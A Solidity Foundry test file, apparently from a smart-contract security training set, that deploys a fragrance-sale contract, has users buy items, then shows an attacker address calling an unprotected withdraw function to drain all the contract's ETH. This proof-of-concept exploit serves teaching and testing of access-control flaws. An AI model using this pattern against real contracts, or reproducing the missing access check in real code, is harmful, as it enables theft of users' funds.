// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../src/access-control-3/KilianExclusive.sol";

/**
@dev run "forge test --match-contract AC3" 
*/

contract TestAC3 is Test {
    KilianExclusive kilian;

    uint128 public constant FRAGRANCE_PRICE = 10 ether;
    uint128 public constant USER_MINT = 10 ether;
    uint128 public constant ATTACKER_MINT = 10000000 ether;

    uint256 init_attacker_bal;
    uint256 init_vault_bal;

    address deployer;
    address user1;
    address user2;
    address user3;
    address attacker;

    function setUp() public {
        deployer = address(1);
        user1 = address(2);
        user2 = address(3);
        user3 = address(4);
        attacker = address(5);
        vm.deal(user1, 100 ether);
        vm.deal(user2, 100 ether);
        vm.deal(user3, 100 ether);

        vm.startPrank(deployer);
        kilian = new KilianExclusive();

        // Add THE LIQUORS fragrences
        kilian.addFragrance("Apple Brandy");
        kilian.addFragrance("Angles' Share");
        kilian.addFragrance("Roses on Ice");
        kilian.addFragrance("Lheure Verte");

        // Add THE FRESH fragrences
        kilian.addFragrance("Moonligh in Heaven");
        kilian.addFragrance("Vodka on the Rocks");
        kilian.addFragrance("Flower of Immortality");
        kilian.addFragrance("Bamboo Harmony");

        kilian.flipSaleState();

        vm.stopPrank();
    }

    function test_Attack() public {
        console.log("[*] Users Buying Fragrances");
        vm.startPrank(user1);
        kilian.purchaseFragrance{value: FRAGRANCE_PRICE}(1);
        kilian.purchaseFragrance{value: FRAGRANCE_PRICE}(4);
        vm.stopPrank();

        vm.startPrank(user2);
        kilian.purchaseFragrance{value: FRAGRANCE_PRICE}(2);
        kilian.purchaseFragrance{value: FRAGRANCE_PRICE}(3);
        vm.stopPrank();

        vm.startPrank(user3);
        kilian.purchaseFragrance{value: FRAGRANCE_PRICE}(5);
        kilian.purchaseFragrance{value: FRAGRANCE_PRICE}(8);
        vm.stopPrank();

        console.log("[*] Exploit");
        vm.prank(attacker);
        kilian.withdraw(attacker);
        console.log("[+] Exploit Success");

        // Attacker stole all the ETH from the token sale contract
        assertEq(attacker.balance >= FRAGRANCE_PRICE * 6, true);
    }
}
